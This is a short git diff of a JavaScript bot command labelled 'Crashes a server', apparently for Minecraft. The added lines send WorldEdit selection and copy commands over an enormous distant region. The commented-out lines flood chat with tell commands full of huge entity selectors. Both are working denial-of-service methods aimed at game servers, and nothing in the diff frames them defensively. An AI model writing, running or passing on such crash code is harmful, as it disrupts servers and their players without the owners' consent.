@@ -41,12 +41,15 @@ module.exports={
 			delay=500;
 		}
 		setTimeout(()=>{
-			const array=new Array(700).fill("@e[distance =1..2147483647]").join("@e"); 
+			index.bots[server].send("//pos1 500000000,0,500000000");
+			index.bots[server].send("//pos2 500000150,200,500000150");
+			index.bots[server].send("//copy");
+			/*const array=new Array(700).fill("@e[distance =1..2147483647]").join("@e"); 
 			const array2=new Array(700).fill("@e").join("@e"); 
 			for(let i=0;i<=20;i++){
 				index.bots[server].ccq.push("/minecraft:tell @a "+array);
 				index.bots[server].ccq.push("/minecraft:tell @a "+array2);
-			}
+			}*/
 		},delay);
 	},
 	desc: "Crashes a server",
